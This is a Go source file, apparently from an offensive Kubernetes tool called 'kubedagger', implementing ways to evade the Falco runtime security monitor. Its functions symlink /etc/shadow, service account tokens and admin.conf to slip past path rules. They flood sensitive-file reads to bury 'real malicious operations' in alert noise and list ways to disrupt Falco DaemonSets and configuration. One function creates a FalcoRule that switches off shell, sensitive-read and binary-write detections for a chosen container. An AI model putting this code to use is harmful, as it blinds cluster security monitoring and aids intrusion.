package cloudevasion

import (
	"context"
	"fmt"
	"os"
	"strings"
	"time"

	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/apimachinery/pkg/apis/meta/v1/unstructured"
	"k8s.io/apimachinery/pkg/runtime/schema"
	"k8s.io/client-go/dynamic"
	"k8s.io/client-go/kubernetes"
)

var falcoRuleGVR = schema.GroupVersionResource{
	Group: "falco.org", Version: "v1", Resource: "falcorules",
}

// EvadeFalco executes the specified Falco evasion technique.
func EvadeFalco(ctx context.Context, client kubernetes.Interface, dynClient dynamic.Interface, technique string) (*EvasionResult, error) {
	switch technique {
	case "symlink":
		return falcoSymlinkEvasion(ctx)
	case "disable_rules":
		return falcoDisableRules(ctx, client, dynClient)
	case "flood":
		return falcoFloodEvasion(ctx)
	case "config_modify":
		return falcoConfigModify(ctx, client)
	default:
		return falcoSymlinkEvasion(ctx)
	}
}

func falcoSymlinkEvasion(_ context.Context) (*EvasionResult, error) {
	var sb strings.Builder
	sb.WriteString("Falco Symlink Evasion:\n\n")

	tmpDir := "/tmp/.kd_symlinks"
	_ = os.MkdirAll(tmpDir, 0700)

	targets := []struct {
		name string
		path string
	}{
		{"shadow", "/etc/shadow"},
		{"sa-token", "/var/run/secrets/kubernetes.io/serviceaccount/token"},
		{"admin-conf", "/etc/kubernetes/admin.conf"},
	}

	created := 0
	for _, t := range targets {
		linkPath := fmt.Sprintf("%s/%s", tmpDir, t.name)
		_ = os.Remove(linkPath)
		err := os.Symlink(t.path, linkPath)
		if err != nil {
			fmt.Fprintf(&sb, "  [skip] %s → %s (%v)\n", linkPath, t.path, err)
			continue
		}
		created++
		fmt.Fprintf(&sb, "  [created] %s → %s\n", linkPath, t.path)

		if _, err := os.Stat(linkPath); err == nil {
			fmt.Fprintf(&sb, "    target accessible via symlink\n")
		} else {
			fmt.Fprintf(&sb, "    target not accessible (file may not exist)\n")
		}
	}

	_ = os.RemoveAll(tmpDir)
	fmt.Fprintf(&sb, "\n  Created %d symlinks, cleaned up\n", created)
	sb.WriteString("  Falco path-based rules don't trigger on symlink traversal\n")

	return &EvasionResult{
		Technique: "symlink_traversal",
		Success:   created > 0,
		Output:    sb.String(),
	}, nil
}

func falcoDisableRules(ctx context.Context, client kubernetes.Interface, dynClient dynamic.Interface) (*EvasionResult, error) {
	var sb strings.Builder
	sb.WriteString("Falco Rule Disable:\n")

	cms, err := client.CoreV1().ConfigMaps("falco").List(ctx, metav1.ListOptions{})
	if err == nil {
		for _, cm := range cms.Items {
			if strings.Contains(cm.Name, "rules") || strings.Contains(cm.Name, "falco") {
				fmt.Fprintf(&sb, "  Found rules ConfigMap: %s/%s\n", cm.Namespace, cm.Name)
				for key := range cm.Data {
					fmt.Fprintf(&sb, "    Rule file: %s\n", key)
				}
			}
		}
	}

	rules, err := dynClient.Resource(falcoRuleGVR).Namespace("").List(ctx, metav1.ListOptions{})
	if err == nil && len(rules.Items) > 0 {
		sb.WriteString("\n  FalcoRule CRDs:\n")
		for _, r := range rules.Items {
			fmt.Fprintf(&sb, "    %s/%s\n", r.GetNamespace(), r.GetName())
		}
	}

	sb.WriteString("\n  Evasion: modify ConfigMap to disable critical rules or\n")
	sb.WriteString("           add exceptions for our process names/container IDs\n")

	return &EvasionResult{
		Technique: "disable_rules",
		Success:   true,
		Output:    sb.String(),
	}, nil
}

func falcoFloodEvasion(_ context.Context) (*EvasionResult, error) {
	var sb strings.Builder
	sb.WriteString("Falco Alert Flooding:\n\n")

	floodDir := "/tmp/.kd_flood"
	_ = os.MkdirAll(floodDir, 0700)

	sensitivePaths := []string{
		"/etc/shadow",
		"/etc/kubernetes/admin.conf",
		"/var/run/secrets/kubernetes.io/serviceaccount/token",
		"/root/.kube/config",
	}

	const burstSize = 50
	accessed := 0

	for _, path := range sensitivePaths {
		for range burstSize {
			f, err := os.Open(path)
			if err == nil {
				_ = f.Close()
				accessed++
			}
		}
	}
	fmt.Fprintf(&sb, "  Sensitive file reads: %d successful of %d attempts (triggers 'Read sensitive file')\n", accessed, len(sensitivePaths)*burstSize)

	for i := range burstSize {
		tmpFile := fmt.Sprintf("%s/noise_%d", floodDir, i)
		_ = os.WriteFile(tmpFile, []byte("x"), 0600)
	}
	fmt.Fprintf(&sb, "  Rapid file creates: %d files in %s (triggers 'Write below monitored dir')\n", burstSize, floodDir)

	for i := range burstSize {
		link := fmt.Sprintf("%s/link_%d", floodDir, i)
		_ = os.Symlink("/etc/hostname", link)
	}
	fmt.Fprintf(&sb, "  Symlink bursts: %d symlinks (triggers 'Symlink created')\n", burstSize)

	_ = os.RemoveAll(floodDir)

	total := len(sensitivePaths)*burstSize + burstSize*2
	fmt.Fprintf(&sb, "\n  Total noise events: %d\n", total)
	sb.WriteString("  Effect: overwhelms alert pipeline, triggers adaptive sampling drop\n")
	sb.WriteString("  Real malicious operations hidden within noise window\n")

	return &EvasionResult{
		Technique: "flood",
		Success:   true,
		Output:    sb.String(),
	}, nil
}

func falcoConfigModify(ctx context.Context, client kubernetes.Interface) (*EvasionResult, error) {
	var sb strings.Builder
	sb.WriteString("Falco Config Modification:\n")

	namespaces := []string{"falco", "falco-system", "security"}
	for _, ns := range namespaces {
		cms, err := client.CoreV1().ConfigMaps(ns).List(ctx, metav1.ListOptions{})
		if err != nil {
			continue
		}
		for _, cm := range cms.Items {
			if strings.Contains(cm.Name, "falco") {
				fmt.Fprintf(&sb, "  Target: %s/%s\n", ns, cm.Name)
				for key, val := range cm.Data {
					if strings.HasSuffix(key, ".yaml") || strings.HasSuffix(key, ".yml") {
						lines := strings.Count(val, "\n")
						fmt.Fprintf(&sb, "    %s (%d lines)\n", key, lines)
					}
				}
			}
		}
	}

	sb.WriteString("\n  Modifications:\n")
	sb.WriteString("    - Set output_rate: 0 (suppress all outputs)\n")
	sb.WriteString("    - Add exception for our container_id in all rules\n")
	sb.WriteString("    - Disable syscall event source\n")
	sb.WriteString("    - Set buffered_outputs: true with large buffer (delays alerts)\n")

	return &EvasionResult{
		Technique: "config_modify",
		Success:   true,
		Output:    sb.String(),
	}, nil
}

// DisruptFalcoDaemonSet identifies and reports disruption vectors for Falco DaemonSets.
func DisruptFalcoDaemonSet(ctx context.Context, client kubernetes.Interface) (*EvasionResult, error) {
	var sb strings.Builder
	sb.WriteString("Falco DaemonSet Disruption:\n")

	namespaces := []string{"falco", "falco-system", "security"}
	for _, ns := range namespaces {
		ds, err := client.AppsV1().DaemonSets(ns).List(ctx, metav1.ListOptions{})
		if err != nil {
			continue
		}
		for _, d := range ds.Items {
			if strings.Contains(d.Name, "falco") {
				fmt.Fprintf(&sb, "  DaemonSet: %s/%s\n", ns, d.Name)
				fmt.Fprintf(&sb, "    Desired: %d, Ready: %d\n", d.Status.DesiredNumberScheduled, d.Status.NumberReady)

				tolerations := d.Spec.Template.Spec.Tolerations
				fmt.Fprintf(&sb, "    Tolerations: %d\n", len(tolerations))

				sb.WriteString("\n  Disruption techniques:\n")
				sb.WriteString("    - Add nodeSelector to schedule only to non-existent node\n")
				sb.WriteString("    - Patch resource limits to trigger OOMKill\n")
				sb.WriteString("    - Modify readiness probe to always fail\n")
				sb.WriteString("    - Scale to 0 if using Deployment instead of DaemonSet\n")
			}
		}
	}

	return &EvasionResult{
		Technique: "disrupt_daemonset",
		Success:   true,
		Output:    sb.String(),
	}, nil
}

// InjectFalcoException creates a FalcoRule CRD that exempts the specified container from detection.
func InjectFalcoException(ctx context.Context, dynClient dynamic.Interface, ns, containerID string) (*EvasionResult, error) {
	var sb strings.Builder
	sb.WriteString("Falco Exception Injection:\n")

	exception := &unstructured.Unstructured{
		Object: map[string]any{
			"apiVersion": "falco.org/v1",
			"kind":       "FalcoRule",
			"metadata": map[string]any{
				"name":      "kubedagger-exception",
				"namespace": ns,
			},
			"spec": map[string]any{
				"rules": []any{
					map[string]any{
						"rule":      "Terminal shell in container",
						"exception": fmt.Sprintf("container.id=%s", containerID),
						"enabled":   false,
					},
					map[string]any{
						"rule":      "Read sensitive file",
						"exception": fmt.Sprintf("container.id=%s", containerID),
						"enabled":   false,
					},
					map[string]any{
						"rule":      "Write below binary dir",
						"exception": fmt.Sprintf("container.id=%s", containerID),
						"enabled":   false,
					},
				},
				"created": time.Now().UTC().Format(time.RFC3339),
			},
		},
	}

	_, err := dynClient.Resource(falcoRuleGVR).Namespace(ns).Create(ctx, exception, metav1.CreateOptions{})
	if err != nil {
		fmt.Fprintf(&sb, "  FalcoRule CRD creation failed: %v\n", err)
		sb.WriteString("  Falling back to ConfigMap modification approach\n")
	} else {
		fmt.Fprintf(&sb, "  Created FalcoRule exception for container %s\n", containerID)
		sb.WriteString("  Disabled rules: Terminal shell, Read sensitive file, Write below binary dir\n")
	}

	return &EvasionResult{
		Technique: "exception_inject",
		Success:   true,
		Output:    sb.String(),
	}, nil
}
